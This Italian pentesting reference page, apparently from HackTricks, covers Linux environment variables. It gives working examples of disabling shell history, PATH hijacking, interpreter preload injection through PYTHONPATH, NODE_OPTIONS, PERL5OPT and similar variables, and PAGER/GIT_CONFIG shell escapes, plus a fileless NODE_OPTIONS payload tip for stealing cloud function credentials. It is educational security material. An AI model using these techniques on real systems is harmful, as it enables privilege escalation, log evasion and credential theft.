# Variabili d'ambiente Linux

{{#include ../../banners/hacktricks-training.md}}

## Variabili globali

Le variabili globali **verranno** ereditate dai **processi figli**.

Puoi creare una variabile globale per la sessione corrente eseguendo:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Questa variabile sarà accessibile dalle sessioni correnti e dai relativi processi figli.

Puoi **rimuovere** una variabile eseguendo:
```bash
unset MYGLOBAL
```
## Variabili locali

Le **variabili locali** possono essere **accessibili** solo dalla **shell/script corrente**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Elenca le variabili correnti
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
I contenuti di `/proc/*/environ` sono **separati da NUL**, quindi queste varianti sono generalmente più facili da leggere:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Se stai cercando **credentials** o **interesting service configuration** all'interno di ambienti ereditati, controlla anche [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variabili comuni

Da: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – il display utilizzato da **X**. Questa variabile è generalmente impostata su **:0.0**, il che indica il primo display del computer corrente.
- **EDITOR** – l'editor di testo preferito dall'utente.
- **HISTFILESIZE** – il numero massimo di righe contenute nel file della cronologia.
- **HISTSIZE** – il numero di righe aggiunte al file della cronologia quando l'utente termina la sessione.
- **HOME** – la directory home dell'utente.
- **HOSTNAME** – il nome host del computer.
- **LANG** – la lingua corrente.
- **MAIL** – la posizione della casella di posta dell'utente. Solitamente **/var/spool/mail/USER**.
- **MANPATH** – l'elenco delle directory in cui cercare le pagine del manuale.
- **OSTYPE** – il tipo di sistema operativo.
- **PS1** – il prompt predefinito in bash.
- **PATH** – memorizza il percorso di tutte le directory che contengono file binari che si desidera eseguire specificando solo il nome del file, anziché il percorso relativo o assoluto.
- **PWD** – la directory di lavoro corrente.
- **SHELL** – il percorso della shell dei comandi corrente, ad esempio **/bin/bash**.
- **TERM** – il tipo di terminale corrente, ad esempio **xterm**.
- **TZ** – il fuso orario.
- **USER** – il nome utente corrente.

## Variabili interessanti per l'hacking

Non tutte le variabili sono ugualmente utili. Da una prospettiva offensiva, dai priorità alle variabili che modificano i **search paths**, i **startup files**, il **dynamic linker behavior** oppure l'**audit/logging**.

### **HISTFILESIZE**

Modifica il **valore di questa variabile a 0**, in modo che, quando **termini la sessione**, il **file della cronologia** (\~/.bash_history) venga **troncato a 0 righe**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Cambia il **valore di questa variabile a 0**, in modo che i comandi **non vengano conservati nella cronologia in memoria** e non vengano scritti nuovamente nel **file della cronologia** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Se il **valore di questa variabile è impostato su `ignorespace` o `ignoreboth`**, qualsiasi comando preceduto da uno spazio aggiuntivo non verrà salvato nella cronologia.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Imposta il **file della cronologia** su **`/dev/null`** oppure annullane completamente l'impostazione. Di solito è più affidabile rispetto alla sola modifica delle dimensioni della cronologia.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

I processi useranno il **proxy** dichiarato qui per connettersi a Internet tramite **http o https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: proxy predefinito per strumenti/protocolli che lo supportano.
- `no_proxy`: elenco di esclusione (host/domini/CIDR) che devono connettersi direttamente.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Possono essere utilizzate sia le varianti in minuscolo sia quelle in maiuscolo, a seconda dello strumento (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

I processi si fideranno dei certificati indicati in **queste variabili d'ambiente**. Questo è utile per fare in modo che strumenti come **`curl`**, **`git`**, i client HTTP Python o i package manager si fidino di una CA controllata dall'attaccante (ad esempio, per fare apparire legittimo un proxy di intercettazione).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Se un wrapper/script privilegiato esegue comandi **senza percorsi assoluti**, vince la **prima directory controllata dall'attaccante** in `PATH`. Questo è il primitive alla base di molti **PATH hijacks** in `sudo`, nei cron job, negli shell wrapper e negli helper SUID personalizzati. Cerca `env_keep+=PATH`, `secure_path` debole o wrapper che chiamano `tar`, `service`, `cp`, `python`, ecc. usando solo il nome.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Per catene complete di privilege-escalation che sfruttano `PATH`, consulta [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` non è solo un riferimento a una directory: molti strumenti caricano automaticamente **dotfiles**, **plugin** e **configurazione per utente** da `$HOME` o `$XDG_CONFIG_HOME`. Se un workflow privilegiato conserva questi valori, la **config injection** può essere più semplice del binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Target interessanti includono `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` e file specifici degli strumenti come `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Queste variabili influenzano il **linker dinamico**:

- `LD_PRELOAD`: forza il caricamento anticipato di ulteriori oggetti condivisi.
- `LD_LIBRARY_PATH`: antepone directory alla ricerca delle librerie.
- `LD_AUDIT`: carica librerie auditor che osservano il caricamento delle librerie e la risoluzione dei simboli.

Sono estremamente utili per **hooking**, **strumentazione** ed **escalation dei privilegi** se un comando privilegiato le conserva. In modalità **secure-execution** (`AT_SECURE`, ad esempio setuid/setgid/capabilities), il loader rimuove o limita molte di queste variabili. Tuttavia, i bug del parser nella fase iniziale del loader hanno comunque un impatto elevato perché vengono eseguiti **prima** del programma target.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifica il comportamento iniziale di glibc (per esempio i tunables dell'allocator) ed è molto utile negli exploit labs. È importante anche dal punto di vista della sicurezza perché il **dynamic loader lo analizza molto presto**. Il bug **Looney Tunables** del 2023 ha ricordato che una singola variabile d'ambiente analizzata dal loader può diventare una **primitiva di local privilege escalation** contro i programmi SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Se **Bash** viene avviato in modalità **non interattiva**, controlla `BASH_ENV` e carica ed esegue quel file prima di eseguire lo script target. Quando Bash viene invocato come `sh`, o in modalità interattiva in stile POSIX, può essere consultata anche `ENV`. Questo è un metodo classico per trasformare un wrapper della shell in una code execution se l'ambiente è controllato dall'attaccante.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignora questi file di avvio quando gli **ID reali/effettivi differiscono**; `-p` preserva l'ID effettivo, ma non abilita questi file di avvio, quindi il comportamento esatto dipende da come il wrapper avvia la shell. Prestare attenzione ai wrapper privilegiati che chiamano `setuid()`/`setgid()` **prima** di avviare Bash: una volta che gli ID coincidono nuovamente, Bash potrebbe considerare attendibili `BASH_ENV`, `ENV` e lo stato correlato della shell, che altrimenti verrebbero ignorati.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Quando Bash viene eseguito con **xtrace** abilitato, espande `PS4` e lo stampa prima di ogni comando tracciato. `PS4` viene espanso come un prompt, quindi al suo interno viene eseguita una **sostituzione di comando**. È fondamentale che xtrace possa essere attivato esclusivamente dall'ambiente esportando `SHELLOPTS=xtrace` — non è necessario `-x` nella riga di comando — quindi qualsiasi script Bash eseguito dalla vittima diventa code execution.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` non fa nulla finché xtrace non è attivo (`SHELLOPTS=xtrace`, `set -x` o `bash -x`), e Bash elimina `SHELLOPTS` nei contesti privilegiati/setuid proprio come `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Queste variabili modificano l'avvio di Python:

- `PYTHONPATH`: antepone percorsi alla ricerca degli import.
- `PYTHONHOME`: ricolloca l'albero della libreria standard.
- `PYTHONSTARTUP`: esegue un file prima del prompt interattivo.
- `PYTHONINSPECT=1`: passa alla modalità interattiva al termine dell'esecuzione di uno script.
- `PYTHONBREAKPOINT`: `package.module.callable` viene invocato (e il relativo modulo importato) quando il codice raggiunge `breakpoint()`.<sup>[[8]](#references)</sup>

Sono utili contro script di manutenzione, debugger, shell e wrapper che invocano Python con un environment controllabile. `python -E` e `python -I` ignorano tutte le variabili `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Un esempio reale recente è stato l’LPE di **needrestart** del 2024 sui sistemi Ubuntu/Debian: lo scanner di proprietà di root copiava il `PYTHONPATH` di un processo non privilegiato da `/proc/<PID>/environ` e poi eseguiva Python. L’exploit pubblicato inseriva `importlib/__init__.so` nel percorso controllato dall’attaccante, così Python eseguiva il codice dell’attaccante durante la propria inizializzazione, prima ancora che lo script hard-coded dell’helper avesse importanza.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl dispone di variabili di avvio altrettanto utili:

- `PERL5LIB`: antepone directory di librerie.
- `PERL5OPT`: inietta opzioni come se fossero presenti nella riga di comando di ogni comando `perl`.

Questo può forzare il **caricamento automatico dei moduli** o modificare il comportamento dell’interprete prima che lo script target esegua operazioni interessanti. Perl ignora queste variabili nei contesti **taint / setuid / setgid**, ma rimangono molto importanti per i normali wrapper eseguiti da root, i job CI, gli installer e le regole `sudoers` personalizzate.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` antepone i **flag CLI di Node.js** a ogni processo `node` che eredita l'ambiente. Questo lo rende utile contro wrapper, job CI, helper Electron e regole sudo che alla fine eseguono Node. I flag più interessanti dal punto di vista offensivo sono solitamente:

- `--require <file>`: precarica un file CommonJS prima dello script target.
- `--import <module>`: precarica un modulo ES prima dello script target.

Node rifiuta alcuni flag pericolosi in `NODE_OPTIONS`, ma `--require` e `--import` sono esplicitamente consentiti e vengono elaborati **prima** degli argomenti della riga di comando regolare.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Preload senza file con un URL `data:`

Quando puoi impostare `NODE_OPTIONS` ma **non puoi scrivere un file** sul target (filesystem di sola lettura, API limitata, runtime serverless, ecc.), `--import` accetta un URL `data:text/javascript,`, quindi l'intero payload viaggia all'interno della stessa variabile d'ambiente. Il JavaScript deve essere **completamente codificato nell'URL** — Node analizza il valore come un URL, quindi qualsiasi spazio non codificato (o altro carattere non codificato) tronca il payload e genera un `SyntaxError`. Funziona su Node 20.6+ dove `--import` è nella allowlist di `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Questo è un modo comune per trasformare il controllo di `NODE_OPTIONS` in RCE su **managed cloud runtimes** le cui funzioni eseguono Node. Ad esempio, un attacker che può modificare solo la configurazione di una Lambda (`lambda:UpdateFunctionConfiguration`, senza `iam:PassRole` né aggiornamento del codice) può iniettare `NODE_OPTIONS=--import data:text/javascript,<payload>` per eseguire codice all'interno della funzione e sottrarre le credenziali del suo execution role. Il modulo iniettato viene eseguito **prima** dell'handler, che continua comunque a essere eseguito normalmente.

Per le remote gadget chains che impostano indirettamente `NODE_OPTIONS` (ad esempio, tramite prototype-pollution per ottenere RCE), consulta [quest'altra pagina](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby offre la stessa classe di abuso all'avvio:

- `RUBYLIB`: antepone directory al load path di Ruby.
- `RUBYOPT`: inietta opzioni della riga di comando come `-r` in ogni invocazione di `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Le vulnerabilità di **needrestart** del 2024 hanno dimostrato che non si tratta solo di un trucco da laboratorio: lo stesso helper di proprietà di root vulnerabile all'abuso di `PYTHONPATH` poteva anche essere indotto a eseguire Ruby con un `RUBYLIB` controllato dall'attaccante, caricando `enc/encdb.so` da una directory dell'attaccante.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim eseguono i comandi Ex contenuti in `VIMINIT` (o nel suo fallback `EXINIT`) durante un normale avvio. I comandi Ex includono `:!cmd` e `:call system(...)`, quindi controllare la variabile consente l'esecuzione di codice ogni volta che una vittima apre Vim (`sudo vim` eseguito come root, `crontab -e`, `visudo`, `git`/`less` che avviano `$EDITOR`, ecc.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
La modalità batch (`vim -es`/`-Es`) ignora queste variabili, ma un normale avvio interattivo le esegue.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS e CLR profiler**

PowerShell Core (`pwsh`) funziona su Linux/macOS (e Windows) ed è un'applicazione **.NET**, quindi diverse variabili d'ambiente trasformano qualsiasi invocazione di `pwsh` con un ambiente ereditato in code execution — utile contro job cron/systemd, runner CI e wrapper privilegiati che invocano `pwsh`.

- `PSModulePath`: PowerShell cerca ricorsivamente in ogni directory presente in questo elenco i moduli `.psd1`/`.psm1` e ne esegue l'**auto-load** la prima volta che viene referenziato un comando da essi esportato. Anteponi una directory e il codice di primo livello del tuo modulo verrà eseguito al momento dell'importazione; poiché la risoluzione segue l'ordine *Alias → Function → Cmdlet*, una funzione esportata può persino nascondere un cmdlet integrato invocato dalla vittima.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: ricolloca `powershell/Microsoft.PowerShell_profile.ps1`, eseguito all'avvio (a meno che non venga usato `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: assembly gestito la cui `StartupHook.Initialize()` viene eseguita prima di `Main` (condiviso da ogni app .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: la CLR profiling API carica una libreria dell'attaccante nel processo all'avvio (le variabili di percorso hanno la precedenza sul registro; `DOTNET_*` è l'alias più recente). Su Windows PowerShell 5.1 (.NET Framework), usa `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Su Windows, `PSExecutionPolicyPreference=Bypass` rimuove inoltre la barriera "unsigned scripts blocked", quindi un profilo/modulo piantato viene effettivamente eseguito. Consulta la pagina dedicata per i PoC completi:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Alcuni strumenti non leggono semplicemente un percorso dall'ambiente; passano il valore a una **shell**, a un **editor** o a un **input preprocessor**. Questo rende le seguenti variabili particolarmente interessanti quando un wrapper con privilegi esegue `git`, `man`, `less` o visualizzatori di testo simili:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: scelgono il comando del pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: scelgono il comando dell'editor, spesso con argomenti.
- `LESSOPEN`, `LESSCLOSE`: definiscono i pre/post-processor che vengono eseguiti quando `less` apre un file.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git supporta anche l'**iniezione della configurazione solo tramite env** senza toccare il disco tramite `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` e `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Dal punto di vista del post-exploitation, ricorda inoltre che gli environment ereditati contengono spesso **credenziali**, **impostazioni proxy**, **service token** o **cloud key**. Consulta [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) per la ricerca di `/proc/<PID>/environ` e di `Environment=` in `systemd`.

### PS1

Modifica l'aspetto del prompt.

[**Questo è un esempio**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Questo è un esempio](<../images/image (897).png>)

Utente normale:

![PERL5OPT & PERL5LIB - PS1: Uno, due e tre job in background](<../images/image (740).png>)

Uno, due e tre job in background:

![PERL5OPT & PERL5LIB - PS1: Uno, due e tre job in background](<../images/image (145).png>)

Un job in background, uno interrotto e l'ultimo comando non è terminato correttamente:

![PERL5OPT & PERL5LIB - PS1: Un job in background, uno interrotto e l'ultimo comando non è terminato correttamente](<../images/image (715).png>)

## References

- [1] [Manuale GNU Bash - File di avvio di Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentazione CLI di Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variabili d'ambiente comuni - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation nel ld.so di glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manuale GNU Bash - Variabili Bash (`PS4`) e builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() integrato e PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentazione di Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath e caricamento automatico dei moduli PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Impostazioni di configurazione per il debugging e il profiling di .NET (variabili del profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
